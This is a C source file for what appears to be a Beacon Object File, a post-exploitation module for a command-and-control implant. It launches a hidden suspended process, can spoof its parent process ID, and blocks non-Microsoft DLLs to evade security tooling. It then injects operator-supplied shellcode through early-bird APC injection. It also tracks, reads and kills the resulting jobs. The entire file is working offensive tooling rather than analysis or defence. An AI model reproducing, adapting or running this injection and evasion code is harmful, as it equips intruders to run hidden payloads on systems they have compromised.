#include <windows.h>
#include <stdio.h> // snprintf
#include "beacon.h"

// --- Manual Definitions for Attributes ---
#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif
#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
#endif
#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
#endif

// --- Structs ---
typedef struct _MY_STARTUPINFOEXA {
    STARTUPINFOA StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} MY_STARTUPINFOEXA, *PMY_STARTUPINFOEXA;

typedef struct _JOB_CONTEXT {
    HANDLE hReadPipe;
    HANDLE hProcess;
    DWORD pid;
    int id;
} JOB_CONTEXT, *PJOB_CONTEXT;

// --- Function Pointers ---
typedef BOOL (WINAPI *EXP_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *EXP_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *EXP_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef HLOCAL (WINAPI *EXP_LocalAlloc)(UINT, SIZE_T);
typedef HLOCAL (WINAPI *EXP_LocalFree)(HLOCAL);
typedef BOOL (WINAPI *EXP_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *EXP_SetHandleInformation)(HANDLE, DWORD, DWORD);
typedef BOOL (WINAPI *EXP_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *EXP_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *EXP_GetExitCodeProcess)(HANDLE, LPDWORD);
typedef void (WINAPI *EXP_Sleep)(DWORD);
typedef DWORD (WINAPI *EXP_GetTempPathA)(DWORD, LPSTR);
typedef UINT (WINAPI *EXP_GetTempFileNameA)(LPCSTR, LPCSTR, UINT, LPSTR);
typedef BOOL (WINAPI *EXP_DeleteFileA)(LPCSTR);
typedef DWORD (WINAPI *EXP_SetFilePointer)(HANDLE, LONG, PLONG, DWORD);

typedef LPVOID (WINAPI *EXP_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL (WINAPI *EXP_HeapFree)(HANDLE, DWORD, LPVOID);
typedef HANDLE (WINAPI *EXP_GetProcessHeap)(VOID);

// --- Custom Memset/Helpers ---
#pragma optimize("", off) 
void * _memset(void *dest, int c, size_t count) {
    char *bytes = (char *)dest;
    while (count--) {
        *bytes++ = (char)c;
    }
    return dest;
}
#pragma optimize("", on)

int _strlen(const char* s) {
    int len = 0;
    while (s[len]) len++;
    return len;
}

// --- Imports ---
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINBASEAPI BOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC(PAPCFUNC, HANDLE, ULONG_PTR);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);

void simple_job_key(char* buf, int id) {
    char* p = buf;
    char* prefix = "donut_job_";
    while (*prefix) *p++ = *prefix++;
    if (id >= 10) {
        *p++ = '0' + (id / 10);
        *p++ = '0' + (id % 10);
    } else {
        *p++ = '0' + id;
    }
    *p = 0;
}

void simple_hex(char* buf, unsigned int val) {
    char* map = "0123456789ABCDEF";
    buf[0] = '\\'; buf[1] = '\\'; buf[2] = '.'; buf[3] = '\\';
    buf[4] = 'p'; buf[5] = 'i'; buf[6] = 'p'; buf[7] = 'e'; buf[8] = '\\';
    buf[9] = 'd'; buf[10] = 'n'; buf[11] = 't'; buf[12] = '_';
    int idx = 13;
    for(int i=7; i>=0; i--) {
        buf[idx++] = map[(val >> (i*4)) & 0xF];
    }
    buf[idx] = 0;
}

// --- Actions ---
#define ACTION_RUN_BLOCKING 0
#define ACTION_RUN_ASYNC 1

#include <stdarg.h>

#define ACTION_READ         2
#define ACTION_KILL         3
#define ACTION_LIST         4

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int action = BeaconDataInt(&parser);
    int jobId = BeaconDataInt(&parser);
    int ppid = BeaconDataInt(&parser);
    char* program = BeaconDataExtract(&parser, NULL);
    char* pipeName = BeaconDataExtract(&parser, NULL);  // Pipe name for PPID mode
    int shellcode_len = 0;
    char* shellcode = BeaconDataExtract(&parser, &shellcode_len);

    // --- Dynamic Resolution ---
    HMODULE hKernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    if(!hKernel32) return;

    EXP_InitializeProcThreadAttributeList pInitializeProcThreadAttributeList = (EXP_InitializeProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    EXP_UpdateProcThreadAttribute pUpdateProcThreadAttribute = (EXP_UpdateProcThreadAttribute)KERNEL32$GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    EXP_DeleteProcThreadAttributeList pDeleteProcThreadAttributeList = (EXP_DeleteProcThreadAttributeList)KERNEL32$GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");
    EXP_LocalAlloc pLocalAlloc = (EXP_LocalAlloc)KERNEL32$GetProcAddress(hKernel32, "LocalAlloc");
    EXP_LocalFree pLocalFree = (EXP_LocalFree)KERNEL32$GetProcAddress(hKernel32, "LocalFree");
    EXP_CreatePipe pCreatePipe = (EXP_CreatePipe)KERNEL32$GetProcAddress(hKernel32, "CreatePipe");
    EXP_SetHandleInformation pSetHandleInformation = (EXP_SetHandleInformation)KERNEL32$GetProcAddress(hKernel32, "SetHandleInformation");
    EXP_ReadFile pReadFile = (EXP_ReadFile)KERNEL32$GetProcAddress(hKernel32, "ReadFile");
    EXP_PeekNamedPipe pPeekNamedPipe = (EXP_PeekNamedPipe)KERNEL32$GetProcAddress(hKernel32, "PeekNamedPipe");
    EXP_GetExitCodeProcess pGetExitCodeProcess = (EXP_GetExitCodeProcess)KERNEL32$GetProcAddress(hKernel32, "GetExitCodeProcess");
    EXP_Sleep pSleep = (EXP_Sleep)KERNEL32$GetProcAddress(hKernel32, "Sleep");
    EXP_HeapAlloc pHeapAlloc = (EXP_HeapAlloc)KERNEL32$GetProcAddress(hKernel32, "HeapAlloc");
    EXP_HeapFree pHeapFree = (EXP_HeapFree)KERNEL32$GetProcAddress(hKernel32, "HeapFree");
    EXP_GetProcessHeap pGetProcessHeap = (EXP_GetProcessHeap)KERNEL32$GetProcAddress(hKernel32, "GetProcessHeap");
    EXP_GetTempPathA pGetTempPathA = (EXP_GetTempPathA)KERNEL32$GetProcAddress(hKernel32, "GetTempPathA");
    EXP_GetTempFileNameA pGetTempFileNameA = (EXP_GetTempFileNameA)KERNEL32$GetProcAddress(hKernel32, "GetTempFileNameA");
    EXP_DeleteFileA pDeleteFileA = (EXP_DeleteFileA)KERNEL32$GetProcAddress(hKernel32, "DeleteFileA");
    EXP_SetFilePointer pSetFilePointer = (EXP_SetFilePointer)KERNEL32$GetProcAddress(hKernel32, "SetFilePointer");

    if(!pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve API symbols.");
        return;
    }

    // --- Dispatch Action ---
    if (action == ACTION_LIST) {
        BeaconPrintf(CALLBACK_OUTPUT, "=== Active Jobs ===");
        char key[64];
        BOOL found = FALSE;
        for(int i=1; i<=20; i++) {
            simple_job_key(key, i);
            PJOB_CONTEXT ctx = (PJOB_CONTEXT)BeaconGetValue(key);
            if(ctx) {
                found = TRUE;
                DWORD ec = 0;
                pGetExitCodeProcess(ctx->hProcess, &ec);
                const char* status = (ec == STILL_ACTIVE) ? "Running" : "Exited";
                BeaconPrintf(CALLBACK_OUTPUT, "Job %d: PID %d [%s]", i, ctx->pid, status);
            }
        }
        if(!found) BeaconPrintf(CALLBACK_OUTPUT, "No active jobs found.");
        return;
    }

    if (action == ACTION_READ || action == ACTION_KILL) {
        char key[64];
        simple_job_key(key, jobId);
        PJOB_CONTEXT ctx = (PJOB_CONTEXT)BeaconGetValue(key);
        
        if (!ctx) {
            BeaconPrintf(CALLBACK_ERROR, "Job %d not found.", jobId);
            return;
        }

        if (action == ACTION_READ) {
            char buffer[1024];
            DWORD bytesRead = 0;
            DWORD bytesAvail = 0;
            DWORD ec = 0;
            BOOL hasOutput = FALSE;
            
            // Read output from PIPE (Non-Blocking Check)
            while(TRUE) {
                if(pPeekNamedPipe(ctx->hReadPipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
                    if(pReadFile(ctx->hReadPipe, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead > 0) {
                        buffer[bytesRead] = 0;
                        hasOutput = TRUE;
                        // Emit for server storage
                        BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|output|%d|0||running|0|%s", jobId, buffer);
                        // Also show to user
                        BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                    } else break;
                } else break; 
            }
            
            pGetExitCodeProcess(ctx->hProcess, &ec);
            if(ec != STILL_ACTIVE) {
               // Emit exit status for server
               BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|exited|%d|%d||exited|%d|", jobId, ctx->pid, ec);
               BeaconPrintf(CALLBACK_OUTPUT, "[*] Job %d has finished (Code: %d).", jobId, ec);
               
               // Cleanup
               KERNEL32$CloseHandle(ctx->hProcess);
               KERNEL32$CloseHandle(ctx->hReadPipe);
               HANDLE hHeap = pGetProcessHeap();
               pHeapFree(hHeap, 0, ctx);
               BeaconRemoveValue(key);
            } else if (!hasOutput) {
               BeaconPrintf(CALLBACK_OUTPUT, "[*] Job %d still running, no new output.", jobId);
            }
        } 
        else if (action == ACTION_KILL) {
             KERNEL32$TerminateProcess(ctx->hProcess, 0);
             
             // Emit crashed status for server
             BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|crashed|%d|%d||crashed|1|", jobId, ctx->pid);
             
             KERNEL32$CloseHandle(ctx->hProcess);
             KERNEL32$CloseHandle(ctx->hReadPipe); 
             
             HANDLE hHeap = pGetProcessHeap();
             pHeapFree(hHeap, 0, ctx);
             BeaconRemoveValue(key);
             BeaconPrintf(CALLBACK_OUTPUT, "Job %d killed/removed.", jobId);
        }
        return;
    }

    // --- RUNNING ---
    if(!program || !shellcode) {
        BeaconPrintf(CALLBACK_ERROR, "Missing program or shellcode.");
        return;
    }

    // --- Pipes ---
    // 1. Output Pipe (Named Pipe for Asynchronous/Overlapped compat if needed, simplifies ID)
    char localPipeName[64];
    char* effectivePipeName = pipeName;  // Use JS-provided name if available
    
    if (!pipeName || pipeName[0] == '\0') {
        // Generate local pipe name if not provided
        unsigned int tick = KERNEL32$GetTickCount();
        simple_hex(localPipeName, tick); 
        effectivePipeName = localPipeName;
    }

    HANDLE hReadPipe = KERNEL32$CreateNamedPipeA(
        effectivePipeName,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        4096,
        4096,
        0,
        NULL
    );

    if (hReadPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe failed: %d", KERNEL32$GetLastError());
        return;
    }
    
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hWritePipe = KERNEL32$CreateFileA(
        effectivePipeName,
        GENERIC_WRITE,
        0,
        &sa,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hWritePipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile(Pipe) failed: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hReadPipe);
        return;
    }

    // 2. Input Pipe (Anonymous)
    // We give the Read end to the Child. We keep the Write end (closed or kept).
    HANDLE hStdInRead = NULL;
    HANDLE hStdInWrite = NULL;
    if (!pCreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
         BeaconPrintf(CALLBACK_ERROR, "CreatePipe(In) failed: %d", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hReadPipe);
         KERNEL32$CloseHandle(hWritePipe);
         return;
    }
    // Ensure Write end is NOT inherited?
    pSetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi;
    MY_STARTUPINFOEXA si_ex;
    STARTUPINFOA si_plain;
    LPSTARTUPINFOA si_ptr = NULL;
    DWORD creationFlags = CREATE_SUSPENDED;
    
    _memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    _memset(&si_ex, 0, sizeof(MY_STARTUPINFOEXA));
    _memset(&si_plain, 0, sizeof(STARTUPINFOA));

    HANDLE hParent = NULL;
    BOOL useParent = (ppid > 0);
    DWORD attributeCount = 0;
    BOOL useBlockDLLs = 1; 
    BOOL usePipeClient = FALSE;  // Whether shellcode will connect to pipe as client

    // If PPID is specified and we have a pipe name, use the client approach
    if(useParent && pipeName && pipeName[0] != '\0') {
        usePipeClient = TRUE;
        useBlockDLLs = 0;  // Disable BlockDLLs when PPID spoofing
        
        // Close the old pipes - we'll create a new one with the provided name
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        KERNEL32$CloseHandle(hStdInRead);
        KERNEL32$CloseHandle(hStdInWrite);
        
        // Create named pipe server with the provided name
        hReadPipe = KERNEL32$CreateNamedPipeA(
            pipeName,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            4096,
            4096,
            0,
            NULL
        );
        
        if (hReadPipe == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe(%s) failed: %d", pipeName, KERNEL32$GetLastError());
            return;
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "DEBUG: Created pipe server: %s", pipeName);
        
        // Open parent process
        hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
        if(!hParent) {
            BeaconPrintf(CALLBACK_ERROR, "OpenProcess(PPID %d) failed: %d", ppid, KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }
        
        attributeCount = 1;  // Only PARENT_PROCESS, no HANDLE_LIST needed
    } else if(!useParent) {
        // Normal mode - use BlockDLLs
        if(useBlockDLLs) attributeCount++;
    }

#ifndef PROC_THREAD_ATTRIBUTE_HANDLE_LIST
#define PROC_THREAD_ATTRIBUTE_HANDLE_LIST 0x00020002
#endif

    if(usePipeClient) {
        // PPID mode with pipe client - no handle redirection in STARTUPINFO
        si_ex.StartupInfo.cb = sizeof(MY_STARTUPINFOEXA);
        si_ex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;  // No STARTF_USESTDHANDLES!
        si_ex.StartupInfo.wShowWindow = SW_HIDE;
        si_ptr = (LPSTARTUPINFOA)&si_ex;
        creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        
        SIZE_T attributeSize = 0;
        pInitializeProcThreadAttributeList(NULL, attributeCount, 0, &attributeSize);
        si_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pLocalAlloc(LPTR, attributeSize);
        if(!si_ex.lpAttributeList || !pInitializeProcThreadAttributeList(si_ex.lpAttributeList, attributeCount, 0, &attributeSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitAttribList failed: %d", KERNEL32$GetLastError());
            KERNEL32$CloseHandle(hParent);
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }
        
        // Only set PARENT_PROCESS - no HANDLE_LIST needed (stub connects to pipe)
        if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(Parent) failed: %d", KERNEL32$GetLastError());
        }
    } else if(attributeCount > 0) {
        // Normal mode with BlockDLLs
        si_ex.StartupInfo.cb = sizeof(MY_STARTUPINFOEXA);
        si_ex.StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si_ex.StartupInfo.wShowWindow = SW_HIDE;
        si_ex.StartupInfo.hStdOutput = hWritePipe;
        si_ex.StartupInfo.hStdError = hWritePipe;
        si_ex.StartupInfo.hStdInput = hStdInRead;
        si_ptr = (LPSTARTUPINFOA)&si_ex;
        creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        
        // Ensure handles are inheritable
        pSetHandleInformation(hWritePipe, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        pSetHandleInformation(hStdInRead, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
        
        SIZE_T attributeSize = 0;
        pInitializeProcThreadAttributeList(NULL, attributeCount, 0, &attributeSize);
        si_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pLocalAlloc(LPTR, attributeSize);
        if(!si_ex.lpAttributeList || !pInitializeProcThreadAttributeList(si_ex.lpAttributeList, attributeCount, 0, &attributeSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitAttribList failed: %d", KERNEL32$GetLastError());
            return;
        }

        if(useBlockDLLs) {
            DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
            if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL)) {
                 BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(BlockDLLs) failed: %d", KERNEL32$GetLastError());
            }
        }
    } else {
        // Fallback - no attributes
        si_plain.cb = sizeof(STARTUPINFOA);
        si_plain.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si_plain.wShowWindow = SW_HIDE;
        si_plain.hStdOutput = hWritePipe;
        si_plain.hStdError = hWritePipe;
        si_plain.hStdInput = hStdInRead;
        si_ptr = &si_plain;
    }

    // CreateProcess - bInheritHandles is FALSE when using pipe client mode
    BOOL success = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, !usePipeClient, creationFlags, NULL, NULL, si_ptr, &pi);
    
    // Cleanup handles we don't need after CreateProcess
    if(!usePipeClient) {
        // Keep hWritePipe open for Async jobs so JobsController has a valid handle
        if (action != ACTION_RUN_ASYNC) {
            KERNEL32$CloseHandle(hWritePipe);
        }
        KERNEL32$CloseHandle(hStdInRead);
        KERNEL32$CloseHandle(hStdInWrite);
    }

    if (attributeCount > 0 && si_ex.lpAttributeList) {
        pDeleteProcThreadAttributeList(si_ex.lpAttributeList);
        pLocalFree(si_ex.lpAttributeList);
    }
    
    if(!success) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hReadPipe);
        return;
    }

    LPVOID remoteAddr = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(remoteAddr) {
        SIZE_T bytesWritten = 0;
        KERNEL32$WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, shellcode_len, &bytesWritten);
        KERNEL32$QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0);
        DWORD resumeCount = KERNEL32$ResumeThread(pi.hThread);
        if(resumeCount == (DWORD)-1) {
             BeaconPrintf(CALLBACK_ERROR, "ResumeThread failed: %d", KERNEL32$GetLastError());
             KERNEL32$TerminateProcess(pi.hProcess, 0);
             KERNEL32$CloseHandle(pi.hProcess);
             KERNEL32$CloseHandle(pi.hThread);
             KERNEL32$CloseHandle(hReadPipe);
             return;
        }
        
        // Give the thread a moment to initialize and execute the APC
        // Increased from 100ms to 1000ms to ensure stability
        pSleep(1000);
    } else {
         BeaconPrintf(CALLBACK_ERROR, "Injection failed.");
         KERNEL32$TerminateProcess(pi.hProcess, 0);
         KERNEL32$CloseHandle(pi.hProcess);
         KERNEL32$CloseHandle(pi.hThread);
         KERNEL32$CloseHandle(hReadPipe);
         return;
    }

    // --- Async Execution (Default) ---
    // Register the job with the native JobsController
    if (BeaconJobRegister(jobId, pi.hProcess, (WORD)pi.dwProcessId, hReadPipe, hWritePipe)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Job %d started (PID: %d). Pipe Read Handle: %p. Output will stream automatically.", jobId, pi.dwProcessId, hReadPipe);
    } else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to register job. Closing process.");
            KERNEL32$TerminateProcess(pi.hProcess, 0);
            KERNEL32$CloseHandle(pi.hProcess);
    }
    // LEAKING THREAD HANDLE INTENTIONALLY to prevent APC race condition causing crash
    // KERNEL32$CloseHandle(pi.hThread);
}
